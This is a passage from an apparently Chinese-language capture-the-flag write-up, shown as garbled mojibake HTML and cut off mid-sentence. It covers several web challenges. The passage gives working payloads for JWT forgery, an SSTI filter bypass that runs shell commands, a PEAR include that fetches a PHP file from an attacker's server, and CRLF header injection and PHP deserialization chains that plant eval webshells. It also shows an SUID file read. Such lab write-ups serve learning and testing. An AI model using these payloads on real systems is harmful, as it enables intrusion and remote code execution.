ipé™¤äº†å¯ä»¥ç”¨<code>x-forwarded-for</code>è¿˜å¯ä»¥ç”¨<code>X-Real-Ip</code></li><li>jwtè§£å¯†tokenåä¸º<code>python &#123; &quot;iss&quot;: &quot;Starven&quot;, &quot;aud&quot;: &quot;Ctfer&quot;, &quot;iat&quot;: 1729862257, &quot;nbf&quot;: 1729862257, &quot;exp&quot;: 1729869457, &quot;username&quot;: &quot;Starven&quot;, &quot;password&quot;: &quot;qwert123456&quot;, &quot;hasFlag&quot;: false &#125;</code><br>å°†hasFlagæ”¹æˆtrueåä½¿ç”¨Starven_secret_keyåŠ å¯†å›å»å³å¯è·å¾—flag</li></ul><h3 id="Can-you-Pass-Me"><a href="#Can-you-Pass-Me" class="headerlink" title="Can_you_Pass_Me"></a>Can_you_Pass_Me</h3><p>å‘ç°æœ‰ssti<br>é¦–å…ˆæŸ¥æ‰¾è¿‡æ»¤å­—ç¬¦ï¼Œ<br>å‘ç°:<br>è¿‡æ»¤:<code>[]ã€+ã€requestã€å…³é”®å­—ã€:ã€setã€get</code><br>ä¸è¿‡æ»¤:<code>&quot;&quot;ã€__ã€.ã€attrã€reverse</code><br>æ—¢ç„¶<code>attr</code>å¯ä»¥ç”¨æˆ‘ä»¬å°±ä½¿ç”¨<code>reverse</code>è¿›è¡Œç»„åˆ:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;__ssalc__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__esab__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__sessalcbus__&#x27;</span>|reverse)()|attr(<span class="string">&#x27;__metiteg__&#x27;</span>|reverse))%&#125;</span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‰¾åˆ°subclasses,è™½ç„¶pythonç¯å¢ƒæœªçŸ¥ï¼Œä½†å¤§å¤šåœ¨130é™„è¿‘ï¼Œæˆ‘ä»¬å…ˆå–132ï¼Œå†æ ¹æ®å¾—åˆ°çš„å¯¹è±¡ä¸€ä¸ªä¸€ä¸ªæ•°æ‰¾é™„è¿‘wrap_close<br>æœ€åæ‰¾åˆ°æ˜¯140<br>æ„é€ å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„è¯­å¥:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;__ssalc__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__esab__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__sessalcbus__&#x27;</span>|reverse)()|attr(<span class="string">&#x27;__metiteg__&#x27;</span>|reverse)(<span class="number">140</span>)|attr(<span class="string">&#x27;__tini__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__slabolg__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__metiteg__&#x27;</span>|reverse)(<span class="string">&#x27;nepop&#x27;</span>|reverse)(<span class="string">&quot;ls&quot;</span>)|attr(<span class="string">&#x27;daer&#x27;</span>|reverse)())%&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°flagã€\ã€ç­‰å­—ç¬¦è¢«banï¼Œç”¨åå…­è¿›åˆ¶æ›¿æ¢</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;__ssalc__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__esab__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__sessalcbus__&#x27;</span>|reverse)()|attr(<span class="string">&#x27;__metiteg__&#x27;</span>|reverse)(<span class="number">140</span>)|attr(<span class="string">&#x27;__tini__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__slabolg__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__metiteg__&#x27;</span>|reverse)(<span class="string">&#x27;nepop&#x27;</span>|reverse)(<span class="string">&quot;cat \x2f\x66\x6c\x61\x67&quot;</span>)|attr(<span class="string">&#x27;daer&#x27;</span>|reverse)())%&#125;</span><br></pre></td></tr></table></figure><p>æœ€åå‘ç°è¿˜è¿‡æ»¤äº†flagçš„å›æ˜¾ï¼Œç›´æ¥ç”¨envå°±è¡Œ,å†è¿›è¡Œä¸€æ¬¡reverse:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;__ssalc__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__esab__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__sessalcbus__&#x27;</span>|reverse)()|attr(<span class="string">&#x27;__metiteg__&#x27;</span>|reverse)(<span class="number">140</span>)|attr(<span class="string">&#x27;__tini__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__slabolg__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__metiteg__&#x27;</span>|reverse)(<span class="string">&#x27;nepop&#x27;</span>|reverse)(<span class="string">&quot;env&quot;</span>)|attr(<span class="string">&#x27;daer&#x27;</span>|reverse)()|reverse)%&#125;</span><br></pre></td></tr></table></figure><p>å†ä½¿ç”¨pythonå€’è½¬flag:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#125;e3444c55cb6a-a919-3c94-583e-9ea58050&#123;CYS&#x27;</span>[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>æˆåŠŸè§£å‡º</p><h3 id="SecretInDrivingSchool"><a href="#SecretInDrivingSchool" class="headerlink" title="SecretInDrivingSchool"></a>SecretInDrivingSchool</h3><p>æŸ¥çœ‹ç½‘ç«™æºç å‘ç°ç™»å½•ç•Œé¢:L000G1n.php</p><p>æç¤ºç”¨æˆ·å4~16ä½ï¼ŒçŒœæµ‹ä¸º<code>admin</code><br>æç¤ºå¯†ç 3ä½+@chengxing,çˆ†ç ´å¾—<code>SYC@chengxing</code><br>æˆåŠŸè¿›å…¥åå°</p><p>å‘ç°å¹¿å‘Šç•Œé¢å¯ä»¥ä¿®æ”¹å¹¿å‘Šçš„php<br>è¿‡æ»¤äº†å¾ˆå¤šå±é™©å‡½æ•°,ä½†ä½¿ç”¨çš„å¹¶ä¸æ˜¯disable_functions<br>ç›´æ¥æ‹¼æ¥å³å¯ç»•è¿‡:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;sys&quot;</span>.<span class="string">&quot;tem&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="string">&quot;env&quot;</span>);</span><br></pre></td></tr></table></figure><p>è·å¾—flag:<code>SYC&#123;289537ce-182e-4096-93fe-aeb80e53b094&#125;</code></p><h3 id><a href="#" class="headerlink" title></a></h3><h3 id="ez-include"><a href="#ez-include" class="headerlink" title="ez_include"></a>ez_include</h3><p>é¢˜ç›®:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;starven_secret.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/starven_secret.php/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">require_once</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è¿˜æƒ³éé¢„æœŸ?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸€ä¸ªç»•è¿‡require_onceåŒ…å«é™åˆ¶çš„é¢˜<br>è¯¦è§<a href="https://www.anquanke.com/post/id/213235">https://www.anquanke.com/post/id/213235</a><br>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/starven_secret.php</span><br></pre></td></tr></table></figure><p>æˆåŠŸè¿›å…¥ç¬¬äºŒæ­¥&#x2F;levelllll2.php:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span> [<span class="string">&quot;syc&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span> [<span class="string">&quot;syc&quot;</span>];</span><br><span class="line">    <span class="variable">$hint</span> = <span class="string">&quot;register_argc_argv = On&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/config|create|filter|download|phar|log|sess|-c|-d|%|data/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hintéƒ½ç»™çš„è¿™ä¹ˆæ˜æ˜¾äº†è¿˜ä¸ä¼šåš?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], -<span class="number">4</span>) === <span class="string">&#x27;.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿåˆ°register_argc_argv &#x3D; On,å¯èƒ½æ˜¯pearæ–‡ä»¶åŒ…å«æ¼æ´<br>æ„é€ payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/levelllll2.php?syc=/usr/local/lib/php/pearcmd.php&amp;+download+http://vpsåœ°å€:vpsç«¯å£/1.php</span><br></pre></td></tr></table></figure><p>æˆåŠŸgetshell</p><h3 id="ez-ssrf"><a href="#ez-ssrf" class="headerlink" title="ez_ssrf"></a>ez_ssrf</h3><p>é¢˜ç›®æ˜¯ssrf,ä½†æ˜¯é¢˜ç›®é¦–é¡µä»€ä¹ˆéƒ½æ²¡æœ‰<br>ä½¿ç”¨dirsearchæ‰«æç›®å½•å‘ç°<code>www.zip</code>æ³„éœ²<br>å‘ç°ç½‘é¡µæºç :</p><ul><li>h4d333333.php<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$user</span>=<span class="string">&quot;stranger&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$user</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;location&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$location</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;location&#x27;</span>];</span><br><span class="line">    <span class="variable">$client</span>=<span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;location&quot;</span>=&gt;<span class="variable">$location</span>,</span><br><span class="line">        <span class="string">&quot;uri&quot;</span>=&gt;<span class="string">&quot;hahaha&quot;</span>,</span><br><span class="line">        <span class="string">&quot;login&quot;</span>=&gt;<span class="string">&quot;guest&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>=&gt;<span class="string">&quot;gueeeeest!!!!&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user_agent&quot;</span>=&gt;<span class="variable">$user</span>.<span class="string">&quot;&#x27;s Chrome&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$client</span>-&gt;<span class="title function_ invoke__">calculator</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;result.txt&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Please give me a location&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>calculator.php<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$admin</span>=<span class="string">&quot;aaaaaaaaaaaadmin&quot;</span>;</span><br><span class="line"><span class="variable">$adminpass</span>=<span class="string">&quot;i_want_to_getI00_inMyT3st&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$auth</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$admin</span>,<span class="variable">$adminpass</span>;</span><br><span class="line">    <span class="variable">$auth</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;Basic &#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$auth</span>);</span><br><span class="line">    <span class="variable">$auth</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$auth</span>);</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$username</span>, <span class="variable">$password</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;:&#x27;</span>, <span class="variable">$auth</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$username</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="variable">$admin</span> &amp;&amp; <span class="variable">$password</span>===<span class="variable">$adminpass</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]!==<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;Hacker&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$expression</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;expression&#x27;</span>];</span><br><span class="line"><span class="variable">$auth</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_AUTHORIZATION&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$auth</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check</span>(<span class="variable">$auth</span>)===<span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[0-9+\-*\/]+$/&#x27;</span>, <span class="variable">$expression</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Invalid expression&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$result</span>=<span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$expression</span>;&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;result&quot;</span>,<span class="variable">$result</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$result</span>=<span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$expression</span>;&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;result&quot;</span>,<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;Hacker&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>å‘ç°å¯ä»¥è¿›è¡Œè¯·æ±‚å¤´æ³¨å…¥<br>éœ€è¦:</li><li><code>AUTHORIZATION</code>,<code>type</code>ä¸º<code>basic</code>,å€¼ä¸ºbase64åŠ å¯†çš„<code>$admin:$adminpass</code></li><li><code>POST</code>å‚æ•°<code>expression</code>,å€¼ä¸ºæ³¨å…¥çš„phpä»£ç </li></ul><p>æœ€ç»ˆpayloadä¸º:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/h4d333333.php?location=http://127.0.0.1/calculator.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=aaa%0D%0AAuthorization%3ABasic YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0%0D%0AContent-Type%3Aapplication%2Fx-www-form-urlencoded%0D%0AContent-Length%3A80%0D%0A%0D%0Aexpression%3Dfile_put_contents%28%27shell.php%27%2C%27%3C%3Fphp+%40eval%28%24_POST%5B1%5D%29%3B%3F%3E%27%29%3B%26aaa%3Daaaa</span><br></pre></td></tr></table></figure><h1 id="PHPä¸æ¯”Javaå·®"><a href="#PHPä¸æ¯”Javaå·®" class="headerlink" title="PHPä¸æ¯”Javaå·®"></a>PHPä¸æ¯”Javaå·®</h1><p>é¢˜ç›®:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;secret.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Sink</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;!!!A GREAT STEP!!!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Is there any file?&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$FLAG</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Geek</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$change</span>=<span class="variable">$_GET</span>[<span class="string">&quot;change&quot;</span>];</span><br><span class="line">        <span class="variable">$FUNC</span>=<span class="variable">$change</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$FUNC</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Syclover</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Where</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$IS</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Starven</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Girlfriend</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString is called&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$eee</span>=<span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Where</span>(<span class="variable">$this</span>-&gt;IS);</span><br><span class="line">        <span class="variable">$fff</span>=<span class="variable language_">$this</span>-&gt;Starven;</span><br><span class="line">        <span class="variable">$eee</span>-&gt;<span class="variable">$fff</span>(<span class="variable language_">$this</span>-&gt;Girlfriend);</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>ç®€å•åˆ†æåæˆ‘ä»¬å‘ç°:</p><ul><li>ååºåˆ—åŒ–çš„èµ·å§‹ç‚¹åœ¨GEEKç±»</li><li>ä½¿ç”¨çš„æ˜¯php8çš„æ–°é­”æœ¯æ–¹æ³•</li><li><code>$data</code>æ•°ç»„ä¸­çš„å…ƒç´ æ˜¯GEEKç±»çš„å±æ€§</li><li><code>change</code>å‚æ•°æ˜¯æˆ‘ä»¬è‡ªå·±ä¼ çš„,å¯ä»¥ä½¿ç”¨ä»»æ„é­”æœ¯æ–¹æ³•</li><li><code>$FUNC</code>è§¦å‘æ—¶æ— æ³•ä¼ å‚,è”æƒ³åˆ°å¯å˜å‡½æ•°å‘æ•°ç»„è°ƒç”¨</li></ul><p>äºæ˜¯æ„é€ POC:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Challenge</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;file = <span class="string">&#x27;secret.php&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="keyword">array</span>(<span class="variable">$s</span>,<span class="string">&quot;Sink&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>åŒæ—¶ä¼ å‚<code>?change=reset</code>å–<code>$data</code>æ•°ç»„çš„é¦–ä¸ªå…ƒç´ èµ‹å€¼ç»™<code>$FUNC</code><br>ç›´æ¥è°ƒç”¨<code>Challengeç±»</code>çš„<code>Sink</code>è·å¾—å‡flag:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The True Flag is in /flag</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬åªèƒ½å†åˆ©ç”¨<code>Sycloverç±»</code>è¯•å›¾è¯»å–&#x2F;flag<br>æœ‰è¶£çš„æ˜¯<code>__toString</code>é­”æœ¯æ–¹æ³•ä¹Ÿå¯ä»¥ä½¿ç”¨å¯å˜å‡½æ•°çš„æ•°ç»„è°ƒç”¨ç›´æ¥è§¦å‘<br>å‚æ•°<code>where</code>æ˜¯ä¸€ä¸ªç±»ï¼Œè¿™é‡Œè”æƒ³åˆ°phpåŸç”Ÿç±»çš„åˆ©ç”¨</p><p>äºæ˜¯æ„é€ POC:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Syclover</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;Where = <span class="string">&#x27;SplFileObject&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;IS = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;Starven = <span class="string">&#x27;fpassthru&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;Girlfriend = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="keyword">array</span>(<span class="variable">$s</span>,<span class="string">&quot;__toString&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p><del>å¯ä»¥çœ‹åˆ°Starvenå­¦é•¿æ²¡æœ‰Girlfriend</del><br>ååºåˆ—åŒ–ä¹‹å&#x2F;flagå¹¶æ²¡æœ‰è¢«è¯»å–ï¼Œæ˜æ˜æœ¬åœ°æµ‹è¯•æˆåŠŸçš„ï¼Œæ€ä¹ˆå›äº‹å‘¢?<br>çŒœæµ‹è¦ææƒ,è¦ææƒå…ˆå¾—getshell<br>åˆ©ç”¨å¦ä¸€ä¸ªåŸç”Ÿç±»å®ç°<br>ç”±äºç›´æ¥ä½¿ç”¨shelléå¸¸éš¾å—ï¼Œç›´æ¥åœ¨å½“å‰ç½‘é¡µå†™ä¸ªé©¬:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Syclover</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;Where = <span class="string">&#x27;ReflectionFunction&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;IS = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;Starven = <span class="string">&#x27;invoke&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;Girlfriend = <span class="string">&#x27;echo &quot;echo 123;eval(\$_POST[\&#x27;cmd\&#x27;]);&quot;&gt;&gt;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="keyword">array</span>(<span class="variable">$s</span>,<span class="string">&quot;__toString&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å‘½ä»¤:<code>find / -perm -u=s -type f 2&gt;/dev/null</code><br>åˆ—å‡ºæ‰€æœ‰å¯ä½¿ç”¨çš„æœ‰rootæƒé™çš„å‘½ä»¤:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/file</span><br></pre></td></tr></table></figure><p>çœ‹è¿™ä¸ªfileæœ‰èƒ½è¯»æ–‡ä»¶çš„æ„æ€ã€‚ã€‚<br>ä¸€ç•ªæœç´¢åä½¿ç”¨:<code>file -f /flag</code><br>æˆåŠŸé€šè¿‡æŠ¥é”™çš„æ–¹å¼è¯»å–<code>/flag</code>æ–‡ä»¶é‡Œçš„å†…å®¹,æˆåŠŸè·å¾—flag</p><h1 id="not-just-pop"><a href="#not-just-pop" class="headerlink" title="not_just_pop"></a>not_just_pop</h1><p>ä¸Šæ¥æ˜¯ä¸€ä¸ªpopé“¾:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lhRaMK7</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Do</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$You</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$web</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æˆ‘å‹’ä¸ªè±†ï¼Œçœ‹æ¥ä½ 